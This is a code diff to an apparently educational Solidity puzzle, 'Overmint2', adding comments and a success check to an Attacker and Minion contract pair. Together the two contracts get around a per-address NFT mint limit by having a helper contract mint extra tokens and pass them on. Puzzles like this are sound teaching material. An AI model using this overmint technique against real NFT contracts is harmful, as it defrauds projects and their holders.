@@ -2,6 +2,11 @@
 pragma solidity 0.8.15;
 import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
 
+/**
+ * @title Overmint2 Solidity Riddle
+ * @author Josh Guha
+ */
+
 contract Overmint2 is ERC721 {
     using Address for address;
     uint256 public totalSupply;
@@ -28,11 +33,21 @@ contract Attacker {
         minion = _minion;
     }
 
+    /**
+     * @dev Attacks vulnerable contract with Sybil attack
+     */
     function attack() external {
         vulnerableNFT.mint(); // Mint 1
         vulnerableNFT.mint(); // Mint 2
         vulnerableNFT.mint(); // Mint 3
         minion.delegateAttack();
+    }
+
+    /**
+     * @dev Returns Overint2 success
+     */
+    function success() external view returns (bool) {
+        return vulnerableNFT.success();
     }
 }
 
@@ -43,6 +58,9 @@ contract Minion {
         vulnerableNFT = _vulnerableNFT;
     }
 
+    /**
+     * @dev Mints two nfts then transfer to the msg.sender
+     */
     function delegateAttack() external {
         vulnerableNFT.mint(); // Mint 4
         vulnerableNFT.mint(); // Mint 5
